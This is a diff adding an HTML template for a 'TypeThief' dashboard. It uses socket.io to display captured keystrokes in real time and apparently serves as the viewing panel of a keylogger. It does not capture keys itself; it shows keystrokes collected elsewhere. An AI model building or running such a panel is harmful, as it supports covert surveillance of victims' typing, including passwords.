@@ -1,0 +1,44 @@
+
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>TypeThief Real-Time Keystrokes</title>
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.5.1/socket.io.js"></script>
+            <style>
+                body { font-family: Arial, sans-serif; margin: 20px; background: #f0f0f0; }
+                h1 { color: #333; }
+                #keystrokes { background: white; padding: 10px; border: 1px solid #ccc; height: 400px; overflow-y: scroll; }
+            </style>
+        </head>
+        <body>
+            <h1>Real-Time Keystrokes</h1>
+            <div id="keystrokes">
+                {% for keystroke in keystrokes %}
+                    <p>{{ keystroke }}</p>
+                {% endfor %}
+            </div>
+            <script>
+                var socket = io.connect('http://' + document.domain + ':' + location.port);
+                socket.on('connect', function() {
+                    console.log('Connected to server');
+                });
+                socket.on('initial_keystrokes', function(data) {
+                    var div = document.getElementById('keystrokes');
+                    div.innerHTML = '';
+                    data.keystrokes.forEach(function(keystroke) {
+                        var p = document.createElement('p');
+                        p.textContent = keystroke;
+                        div.appendChild(p);
+                    });
+                });
+                socket.on('new_keystroke', function(data) {
+                    var div = document.getElementById('keystrokes');
+                    var p = document.createElement('p');
+                    p.textContent = data.keystroke;
+                    div.appendChild(p);
+                    div.scrollTop = div.scrollHeight;
+                });
+            </script>
+        </body>
+        </html>
+        
